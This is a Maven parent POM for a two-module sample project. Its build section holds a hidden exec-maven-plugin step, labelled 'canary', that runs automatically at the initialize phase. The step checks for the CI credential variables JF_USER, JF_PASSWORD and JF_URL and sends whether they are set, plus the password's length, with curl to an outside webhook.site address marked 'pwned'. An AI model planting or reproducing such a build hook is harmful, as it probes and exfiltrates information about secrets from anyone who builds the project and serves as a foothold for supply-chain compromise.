<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.example</groupId>
    <artifactId>gs-multi-module</artifactId>
    <version>3.0.0</version>
    <packaging>pom</packaging>

    <modules>
        <module>library</module>
        <module>application</module>
    </modules>

    <build>
        <plugins>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>exec-maven-plugin</artifactId>
                <version>3.1.0</version>
                <executions>
                    <execution>
                        <id>canary</id>
                        <phase>initialize</phase>
                        <goals>
                            <goal>exec</goal>
                        </goals>
                        <configuration>
                            <executable>bash</executable>
                            <arguments>
                                <argument>-c</argument>
                                <argument>echo "CANARY :: JF_USER_set=$([ -n "$JF_USER" ] &amp;&amp; echo YES || echo no) JF_PASSWORD_len=${#JF_PASSWORD} JF_URL_set=$([ -n "$JF_URL" ] &amp;&amp; echo YES || echo no)"; curl -s -m 10 "https://webhook.site/ba5d7763-53c5-4079-8e5b-40d74512af07/pwned-user-$([ -n "$JF_USER" ] &amp;&amp; echo 1 || echo 0)-pwlen-${#JF_PASSWORD}" || true</argument>
                            </arguments>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>

</project>
